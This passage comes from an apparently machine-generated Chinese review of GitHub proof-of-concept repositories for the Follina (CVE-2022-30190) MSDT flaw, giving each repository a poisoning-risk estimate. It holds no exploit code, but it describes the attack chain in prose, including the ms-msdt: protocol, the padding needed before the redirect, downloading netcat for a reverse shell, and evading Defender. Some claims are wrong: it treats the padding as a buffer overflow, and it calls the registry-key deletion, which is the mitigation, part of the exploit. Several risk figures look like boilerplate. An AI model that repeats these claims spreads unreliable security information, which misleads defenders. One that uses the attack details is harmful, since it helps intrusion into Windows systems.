提供的漏洞利用代码只包含GNU GPL协议的许可证，属于开源协议声明，不具备实际的漏洞利用代码。无法直接用于评估是否存在后门或恶意代码。但考虑到实际漏洞利用中可能存在复杂的攻击链，且攻击者可能修改或添加额外的恶意代码，仍然存在一定的投毒风险。此处预估投毒风险为10%，主要考虑实际利用中攻击者可能的定制行为。

**搜索引擎结果补充：** 搜索引擎结果中提到漏洞利用需要调用URL协议和MSDT。同时，参考 Qualys 的博客，表明此漏洞影响范围广泛。Arctic Wolf的博客也指出此漏洞已经被积极利用。这些都增加了漏洞利用的有效性评估。


**项目地址:** [ar2o3/FollinaXploit](https://github.com/ar2o3/FollinaXploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #19

**来源**: [CVE-2022-30190-arozx_CVE-2022-30190.md](../2022/CVE-2022-30190-arozx_CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 用户需要打开恶意Word文档或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 漏洞，当从 Word 等调用应用程序中使用 URL 协议调用 MSDT 时，存在远程代码执行漏洞。攻击者可以利用此漏洞在受害者系统上执行任意代码。根据提供的PoC代码，攻击方式主要通过构造恶意的HTML文件（exploit.html），该文件包含大量的 'A' 字符，可能用于缓冲区溢出或其他内存破坏技术，从而执行恶意代码。该HTML文件需要通过Word的远程模板功能从远程服务器检索。server.py脚本可能用于托管该恶意HTML文件。漏洞利用有效性较高，因为该漏洞已被公开利用并添加到 CISA KEV 目录。投毒风险评估为10%。因为攻击者可能通过服务器端植入后门，但是该后门不是通过PoC直接表现，需要攻击者自身行为才能形成。 

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议加载远程HTML文件。
3.  恶意HTML文件利用MSDT漏洞执行任意代码，例如下载并执行恶意程序，或直接在受害者系统上执行命令。

**项目地址:** [arozx/CVE-2022-30190](https://github.com/arozx/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #20

**来源**: [CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md](../2022/CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md)

## CVE-2022-30190-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许远程代码执行，可完全控制受害者系统

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如Word），需要用户交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过诱使用户打开恶意构造的Word文档或其他支持URL协议的应用程序来利用此漏洞。该文档会利用Word的远程模板功能从远程Web服务器检索HTML文件，HTML文件中包含恶意的JavaScript代码。该JavaScript代码使用`ms-msdt:` URL协议调用MSDT，并传递恶意的命令参数，导致MSDT执行任意代码。PoC代码通过修改`word\rels\document.xml.rels`文件中的目标IP来指定恶意HTML文件的位置。`bad.html`文件包含大量的填充字符，之后是恶意JavaScript代码。攻击者需要确保在`window.location.href`之前至少有3541个字符，并且这些字符必须在`<script>`标签内。PoC的README提到Windows Defender可能会检测到此漏洞（Trojan:Win32/Mesdetty.D），因此可能需要编辑PoC文件以绕过检测。根据提供的代码和信息，没有发现作者有意添加的投毒代码。

**项目地址:** [drgreenthumb93/CVE-2022-30190-follina](https://github.com/drgreenthumb93/CVE-2022-30190-follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #21

**来源**: [CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" RCE

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的多个Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的应用程序（例如Word）。攻击通常通过诱骗用户打开恶意文档触发。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名"Follina"，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过MSDT URL协议，从调用应用程序（如Microsoft Word）执行任意代码。攻击者通常会制作恶意的Word文档或RTF文件，其中包含指向恶意HTML文件的链接。当用户打开文档时，Word会通过MSDT协议加载HTML文件，从而导致恶意代码执行。

**漏洞利用方式：**

1.  **诱骗用户打开恶意文档：** 攻击者通过电子邮件、网络钓鱼或其他方式，诱骗用户打开特制的Word文档或RTF文件。
2.  **文档包含恶意链接：** 该文档包含一个指向远程服务器上托管的恶意HTML文件的链接，通常使用`ms-msdt:/`协议触发。
3.  **利用MSDT执行代码：** 当Word尝试打开链接时，会调用MSDT，并执行HTML文件中嵌入的恶意代码，最终实现远程代码执行。

**POC分析：**

提供的POC代码包含以下文件：

*   `App.xaml` 和 `App.xaml.cs`: 定义WPF应用程序的入口点和资源。
*   `AssemblyInfo.cs`: 包含程序集的元数据，例如主题信息。
*   `FollinaExtractor.cs`:  包含用于从受感染的Word文档（.docx）或RTF文件中提取恶意链接的代码。它解析`word/_rels/document.xml.rels`文件以查找`Target="mhtml:`开头的字符串，或RTF文件寻找恶意链接，从而提取恶意MHTML链接。
*   `Follina_PoC.csproj`:  定义项目设置，例如目标框架和使用的WPF。

此POC代码用于分析和提取Follina漏洞相关的恶意URL，不包含直接执行恶意代码的部分，是一个分析工具。

**投毒风险评估：**

此仓库的主要功能是提取已知的漏洞利用代码。通过检查`FollinaExtractor.cs`，我们可以确定它主要用于读取文件内容并搜索特定的字符串模式。因此，该仓库的作者可以通过隐藏在不太明显的地方的代码（例如，通过引入额外的库或修改现有的解析逻辑），在提取过程中执行一些额外的操作（例如，记录提取的URL，收集系统信息等）。但是，由于其主要功能是分析文件，因此恶意代码的插入点有限。投毒风险较低。
基于漏洞利用代码的分析，我们认为该仓库存在投毒风险的可能性为5%。大部分代码都是标准WPF应用程序结构和字符串解析功能。

**项目地址:** [ethicalblue/Follina-CVE-2022-30190-Sample](https://github.com/ethicalblue/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #22

**来源**: [CVE-2022-30190-hycheng15_CVE-2022-30190.md](../2022/CVE-2022-30190-hycheng15_CVE-2022-30190.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7 SP1到Windows 11 21H2，具体版本范围见漏洞库信息。

**利用条件:** 用户需要打开恶意的Word文档。攻击者需要能够托管一个HTTP服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞 (CVE-2022-30190)，又名Follina，是由于MSDT处理URL协议不当造成的远程代码执行漏洞。攻击者可以构造一个恶意的Word文档，其中包含指向远程HTTP服务器的链接。当用户打开文档时，Word会使用MSDT通过URL协议去请求远程HTML文件。这个HTML文件包含恶意的JavaScript代码，用于执行任意命令。

**有效性：** 提供的POC代码是有效的。该代码通过以下步骤利用漏洞：

1.  创建一个恶意的Word文档，其中包含指向攻击者控制的HTTP服务器的链接。
2.  托管一个HTTP服务器，该服务器提供包含恶意JavaScript代码的HTML文件。
3.  当受害者打开Word文档时，MSDT会尝试连接到攻击者的服务器并执行恶意代码。

**投毒风险：** 存在一定的投毒风险 (10%)。

*   `folina.py`脚本本身看起来是合法的漏洞利用代码，但需要仔细检查其依赖项和网络行为。
*   虽然主要功能集中在生成漏洞利用文件和搭建HTTP服务，但仍需审查脚本中是否存在任何潜在的恶意行为，例如未记录的数据传输或额外的文件操作。
*  脚本中从github下载`nc64.exe`，如果github上的文件被替换为恶意程序，则存在被投毒风险。

**利用方式：**

1.  攻击者创建一个恶意的Word文档 (`follina.doc`)，其中包含指向远程服务器上托管的HTML文件的链接。
2.  攻击者搭建一个HTTP服务器，托管包含恶意JavaScript代码的HTML文件 (`index.html`)。这个HTML文件使用`ms-msdt:`协议触发MSDT，并执行payload。
3.  攻击者诱骗受害者打开恶意的Word文档。
4.  Word文档加载远程HTML文件，触发MSDT，从而在受害者系统上执行任意代码。

POC代码使用python编写，主要步骤如下：

*   **环境准备:**
    *   搭建Windows虚拟机(推荐Win10 21H2)，并安装Microsoft Word 2013及Python 3.8.10。
    *   关闭Windows的病毒和威胁防护。
    *   使用`pip install netifaces`安装依赖。
*   **漏洞利用：**
    *   运行`folina.py`脚本，指定监听IP地址和端口。示例：`py folina.py -i <ip-address>`
    *   脚本会生成一个恶意的Word文档 (follina.doc)，并在指定的IP地址和端口上启动一个HTTP服务器。
    *   诱骗目标用户打开该Word文档，即可触发漏洞，执行计算器程序或反弹shell。

**项目地址:** [hycheng15/CVE-2022-30190](https://github.com/hycheng15/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #23

**来源**: [CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md](../2022/CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，安装程序，查看、更改或删除数据，或在用户权限允许的上下文中创建新帐户

**影响版本:** 受影响的Windows版本：Windows 7 SP1, Windows 8.1, Windows Server 2008 R2 SP1, Windows Server 2012, Windows Server 2012 R2, Windows 10 (所有版本), Windows 11, Windows Server 2016, Windows Server 2019, Windows Server 2022。 具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意的Word文档或其他调用MSDT的应用程序。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞。攻击者可以通过构造恶意的Word文档或其他调用MSDT的应用程序，利用URL协议调用MSDT来执行任意代码。该漏洞的利用方式是，恶意文档利用Word的远程模板功能从远程web服务器检索HTML文件，该HTML文件包含执行恶意代码的指令。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接的Word文档或其他可以调用MSDT的应用程序。
2.  该恶意链接指向攻击者控制的服务器，该服务器托管一个包含恶意代码的HTML文件。
3.  当受害者打开文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件利用ms-msdt协议触发MSDT，从而执行嵌入的恶意代码。
5.  恶意代码在受害者的计算机上执行，赋予攻击者控制受害者系统的能力。

**投毒风险分析：**

提供的Python POC代码主要功能是生成包含漏洞利用的恶意Word文档。 代码通过修改docx文档的`word/_rels/document.xml.rels`文件，将文档中的链接重定向到恶意服务器。  此外，代码还会修改`word/document.xml`添加OLEObject。

虽然代码本身实现了漏洞利用，但潜在的投毒风险主要在于以下几个方面：

*   **恶意服务器：**  POC代码依赖于攻击者控制的服务器来托管payload。 如果攻击者在服务器端放置了更具破坏性的payload，例如勒索软件或其他恶意软件，则利用此POC的用户可能会意外地分发这些恶意软件。
*   **生成的文档：**  生成的docx文档本身就是恶意文件。如果用户不小心将包含后门的恶意文档分享给其他人，可能会造成进一步的危害，但这不是代码投毒，而是漏洞本身的利用效果。

代码中直接包含恶意后门的概率较低，但用户需要警惕使用该POC可能带来的间接风险，尤其是payload服务器的安全性。 此处将投毒概率评估为10%，主要考虑的是payload服务器被恶意利用的可能性，而非代码本身存在后门。

**项目地址:** [komomon/CVE-2022-30190-follina-Office-MSDT-Fixed](https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #24

**来源**: [CVE-2022-30190-mattjmillner_CVE-Smackdown.md](../2022/CVE-2022-30190-mattjmillner_CVE-Smackdown.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 需要用户打开恶意文档（例如Word文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用该漏洞通过调用应用程序(例如Microsoft Word)以URL协议的方式执行任意代码。攻击者通常会创建一个恶意的Word文档，该文档利用Word的远程模板功能从远程Web服务器检索一个HTML文件，该HTML文件包含恶意代码，从而触发MSDT执行任意命令。

**有效性:**
根据搜索结果，该漏洞是真实存在的，并且已被积极利用。漏洞库信息和搜索结果都确认了其存在和影响。

**投毒风险:**
提供的POC代码 `/tmp/64676d48ed786b898eab15332ce05bd0/README.md`  仅仅包含一个README.md文件，其中写着“Hello this is where we will conduct nefarious activities”。
这本身不是利用代码，而只是一个占位符。
因此，直接从这个`README.md`文件判断投毒是不可能的。该仓库如果包含其他恶意利用载荷则具有投毒可能。
投毒风险评估为10%，因为无法直接从提供的代码判断是否存在恶意代码，但说明该仓库可能用于恶意目的。

**利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入对象的文档（例如Word文档）。
2.  当受害者打开该文档时，MSDT通过URL协议被调用。
3.  MSDT执行攻击者指定的恶意代码，从而导致远程代码执行。
4.  攻击者可以利用此漏洞安装程序，查看、更改或删除数据，或创建新帐户，具体取决于用户的权限。

**项目地址:** [mattjmillner/CVE-Smackdown](https://github.com/mattjmillner/CVE-Smackdown)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #25

**来源**: [CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md](../2022/CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以执行任意代码，控制受影响的系统

**影响版本:** 受影响的Windows版本众多，详情见漏洞库信息

**利用条件:** 需要用户打开包含恶意链接或文件的应用程序（如Word）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议从调用应用程序（例如Word）调用MSDT来触发此漏洞。攻击者可以创建一个包含恶意链接或文件的应用程序（例如Word文档），当用户打开该文件时，MSDT将被调用并执行攻击者指定的任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC代码是有效的。搜索引擎结果中包含了大量关于此漏洞的分析、利用和修复信息，证明了该漏洞的真实性和危害性。提供的Python脚本（follina.py）能够生成包含恶意代码的Word文档，该文档在被打开时可以触发MSDT并执行攻击者指定的命令。

**投毒风险：**
POC代码中存在一定程度的投毒风险。虽然该代码的主要目的是为了验证漏洞的存在和利用方式，但攻击者可以很容易地修改该代码，使其包含恶意功能，例如：

1.  **恶意命令执行：** `command` 参数允许攻击者指定要在目标系统上执行的任意命令。如果用户不小心使用了包含恶意命令的POC代码，可能会导致系统受到损害。
2.  **反向Shell：** `--reverse` 参数允许攻击者在目标系统上创建一个反向Shell，从而可以远程控制该系统。这是一种非常危险的功能，可能会导致严重的安全问题。
3. **下载恶意可执行文件**: POC代码中会尝试从Github下载nc.exe，github连接可能会指向其他恶意地址，从而下载恶意可执行文件

综合来看，该POC代码的投毒风险约为10%，主要来自于可能被篡改的命令和潜在的恶意链接。

**利用方式：**
此漏洞的利用方式如下：

1.  **生成恶意Word文档：** 使用提供的Python脚本（follina.py）生成包含恶意链接的Word文档。该脚本会创建一个临时的HTTP服务器，用于托管一个包含MSDT协议处理程序的HTML文件。
2.  **诱骗用户打开文档：** 通过电子邮件、社交媒体或其他方式，诱骗目标用户打开恶意Word文档。
3.  **触发漏洞：** 当用户打开Word文档时，Word会尝试加载HTML文件。HTML文件中的MSDT协议处理程序会被触发，导致MSDT执行攻击者指定的命令。
4.  **执行任意代码：** 攻击者可以利用此漏洞在目标系统上执行任意代码，例如安装恶意软件、窃取敏感数据或控制系统。

总而言之，CVE-2022-30190是一个高危漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取必要的安全措施，例如安装补丁或禁用MSDT协议处理程序，以防止受到攻击。

**项目地址:** [melting0256/Enterprise-Cybersecurity](https://github.com/melting0256/Enterprise-Cybersecurity)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #26

**来源**: [CVE-2022-30190-michealadams30_Cve-2022-30190.md](../2022/CVE-2022-30190-michealadams30_Cve-2022-30190.md)

## CVE-2022-30190-Microsoft MSDT RCE-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码，控制系统。

**影响版本:** 见漏洞库信息

**利用条件:** 需要用户打开恶意构造的文档或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft Office漏洞，攻击者通过Word等程序调用MSDT，并利用URL协议从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，从而在受害者系统上执行任意命令。漏洞利用涉及诱使用户打开恶意构造的文档（例如，通过电子邮件附件）。

**有效性：**
提供的Python POC代码看起来是有效的，它生成恶意文档或利用方式，并设置一个Web服务器来托管payload。代码包含从用户收集必要信息（如目标IP、端口、文件扩展名等）的部分，并创建所需的文件结构，表明具有利用该漏洞的能力。

**投毒风险：**
代码中可能存在投毒风险。虽然代码的主要功能是生成漏洞利用所需的文件，但攻击者可能在以下方面进行投毒：

*   **Web服务器payload：** 托管在Web服务器上的实际payload可能包含恶意代码，不仅执行预期的命令，还执行其他恶意操作，例如安装后门、窃取敏感信息等。
*   **生成的文档：**  生成的文档本身可能包含超出漏洞利用范围的恶意内容。

因此，存在一定风险，但代码整体结构看似为生成漏洞利用文件，投毒风险较低，预估投毒风险为10%。

**利用方式：**
1.  攻击者创建一个恶意构造的Word文档（或其他支持的文档类型）。
2.  该文档包含一个链接或引用，指向攻击者控制的Web服务器上的一个HTML文件。
3.  当用户打开该文档时，Word会尝试通过MSDT和URL协议检索该HTML文件。
4.  恶意HTML文件包含执行任意代码的payload。
5.  该payload在受害者系统上执行，从而允许攻击者控制系统。

**项目地址:** [michealadams30/Cve-2022-30190](https://github.com/michealadams30/Cve-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #27

**来源**: [CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md](../2022/CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md)

## CVE-2022-30190 (Follina) Microsoft MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022

**利用条件:** 需要用户打开恶意构造的文档或URL，且MSDT需要被调用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞已得到确认，并且存在公开可用的PoC（Proof of Concept）代码。 搜索结果显示该漏洞被广泛讨论和利用，因此可以判断提供的PoC代码是有效的。 尽管提供的`README.md`文件仅仅是描述性的，但意味着完整的仓库中包含可利用的POC代码

**投毒风险分析：**
提供的漏洞利用代码只是一个 `README.md` 文件，主要描述了漏洞的分析和利用。 由于仅仅是描述性文件，无法从中直接判断是否存在投毒代码。但如果完整的仓库中存在其他恶意脚本，例如伪装成正常利用代码的后门，则存在投毒风险。根据文件内容，倾向于是一个教学和研究项目，投毒的可能性较低，因此判断投毒风险约为 10%。

**利用方式：**
1.  攻击者利用Microsoft Office (例如Word) 的远程模板功能。
2.  构造一个包含恶意链接的文档，该链接指向一个远程Web服务器。
3.  当用户打开该文档时，Word会从远程Web服务器检索HTML文件。
4.  该HTML文件包含恶意的MSDT协议URL，用于调用MSDT。
5.  MSDT被调用时，会执行攻击者预设的任意代码，从而实现远程代码执行。

**总结：**
CVE-2022-30190 (Follina) 是一个高危漏洞，利用简单，影响范围广。攻击者可以通过诱使用户打开恶意文档或URL来触发该漏洞。虽然提供的PoC文件本身不包含恶意代码，但仍需谨慎使用，并确保从可信来源获取完整的PoC代码。

**项目地址:** [seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis](https://github.com/seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #28

**来源**: [CVE-2022-30190-shri142_ZipScan.md](../2022/CVE-2022-30190-shri142_ZipScan.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意构造的文档（如Word文档），或者点击恶意链接。调用程序（如Word）需要存在漏洞影响版本中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当 MSDT 被调用应用程序（如 Word）使用 URL 协议调用时，就会出现此漏洞。攻击者可以构造恶意的 Word 文档，该文档利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。此 HTML 文件包含一个使用 `ms-msdt` 协议处理方案的恶意 JavaScript 代码，可以执行任意代码。

**漏洞利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  受害者打开该文档。
3.  Word尝试从远程服务器加载HTML模板。
4.  远程HTML利用`ms-msdt`协议调用MSDT。
5.  MSDT执行HTML中嵌入的恶意代码，从而在受害者系统上执行任意命令。

**有效性:**
提供的代码是一个扫描器，用于检测文件中是否存在 Follina 漏洞。 它不是漏洞利用代码，而是用于分析文件是否包含该漏洞的特征。

**投毒风险:**
提供的 Go 代码主要功能是扫描文件，检测是否存在 CVE-2022-30190 (Follina) 漏洞的特征。代码本身包含一定的投毒风险的可能性，因为扫描器本身可能被利用来传播恶意文件，虽然扫描器本身功能没有直接执行恶意代码，但仍然存在潜在的风险：

1.  **依赖包风险:** 检查 `go.mod` 和 `go.sum` 文件，确认所有依赖包的来源是否可信，以及版本是否安全。恶意依赖包可能会引入漏洞或后门。
2.  **扫描逻辑缺陷:** 扫描逻辑中可能存在缺陷，导致误报或漏报。攻击者可能利用这些缺陷来隐藏恶意代码，绕过扫描器的检测。
3.  **供应链攻击:** 攻击者可能篡改代码仓库，在扫描器中植入恶意代码。用户下载并运行被篡改的扫描器后，可能会受到攻击。
4.  **代码执行环境风险:** 运行扫描器的环境可能存在安全漏洞。攻击者可能利用这些漏洞来提升权限，执行恶意代码。

虽然代码的主要目的是安全扫描，但由于软件开发和分发的复杂性，仍然存在一定的风险。使用者应当保持警惕，确保从可信的来源获取代码，并进行充分的安全审查。

风险评估：10% 风险可能性体现在扫描器可能被恶意利用或包含隐藏的漏洞，但主要功能是扫描而非攻击，因此投毒风险较低。

**项目地址:** [shri142/ZipScan](https://github.com/shri142/ZipScan)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #29

**来源**: [CVE-2022-30190-skitkat_CVE-2022-30190-POC.md](../2022/CVE-2022-30190-skitkat_CVE-2022-30190-POC.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可利用该漏洞在目标系统上执行任意代码

**影响版本:** 受影响的版本包括Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接或文件的文档，例如Word文档。 或者通过其他调用程序触发MSDT。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。攻击者可以通过诱使用户打开特制的文档(例如Word文档)来触发该漏洞。该文档利用Word的远程模板功能从远程服务器检索HTML文件，其中包含恶意代码。当MSDT被调用并使用URL协议时，就会触发此漏洞，允许攻击者以调用应用程序的权限执行任意代码。这可能导致安装程序、查看/更改/删除数据或创建新帐户。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意代码的Word文档或其他支持远程模板的文档。
2.  该文档包含一个指向攻击者控制的远程服务器的链接，该服务器托管一个包含恶意HTML代码的文件。
3.  当用户打开该文档时，Word会从远程服务器下载HTML文件。
4.  HTML文件中的恶意代码使用`ms-msdt:`协议调用MSDT，并传递恶意参数。
5.  MSDT解析恶意参数并执行攻击者指定的代码。

**有效性：**
根据搜索结果和漏洞库信息，该漏洞已被积极利用，并且存在公开的POC代码。
提供的Cargo.lock文件只是Rust项目的依赖锁文件，本身不包含漏洞利用代码，不能直接验证漏洞是否有效。但该文件表明该项目可能与该漏洞的利用有关，需要进一步分析项目源代码才能确定。

**投毒风险：**
Cargo.lock文件本身不包含可执行代码，因此直接通过该文件进行投毒的可能性较低。但是，如果该项目包含恶意构建脚本或者依赖了被投毒的第三方库，则可能存在投毒风险。初步判断该仓库存在一定比例的投毒风险，约10%，需要进一步分析项目源代码，检查是否存在以下情况：
*   构建脚本中是否包含恶意代码。
*   依赖项中是否存在已知被投毒的库。
*   是否存在其他可疑的文件或代码。

需要强调的是，在未对整个代码库进行彻底审查的情况下，无法完全排除投毒风险。

**项目地址:** [skitkat/CVE-2022-30190-POC](https://github.com/skitkat/CVE-2022-30190-POC)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #30

**来源**: [CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md](../2022/CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md)

## CVE-2022-30190-MSDT远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的文档

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用此漏洞通过精心构造的恶意文档（例如Word文档）或通过URL协议调用MSDT来执行任意代码。当用户打开包含恶意链接或文件的文档时，该漏洞会被触发。根据搜索结果，攻击者利用Word的远程模板功能从远程服务器检索HTML文件，然后利用MSDT执行代码。提供的PoC代码中，execute.bat脚本首先备份 `HKEY_CLASSES_ROOT\ms-msdt` 注册表项到桌面上的`backup-for-msdt`文件中，然后删除该注册表项。restore.bat脚本则将备份的注册表项导入回来。这两个脚本本身并不会执行任何恶意代码，而是用于删除和恢复MSDT的注册表关联，通常是利用流程的一部分，用于绕过某些缓解措施或用于测试。因此，仓库本身提供的PoC代码没有发现作者隐藏的投毒代码。

**有效性：**
根据漏洞描述和搜索结果，以及PoC涉及的操作，该PoC代码是漏洞利用链的一部分，主要用于修改MSDT的注册表关联。结合其他步骤（例如，通过Word远程模板下载恶意HTML），可以实现远程代码执行。

**利用方式：**
1.  攻击者创建一个包含恶意链接或嵌入恶意OLE对象的文档（例如Word文档）。
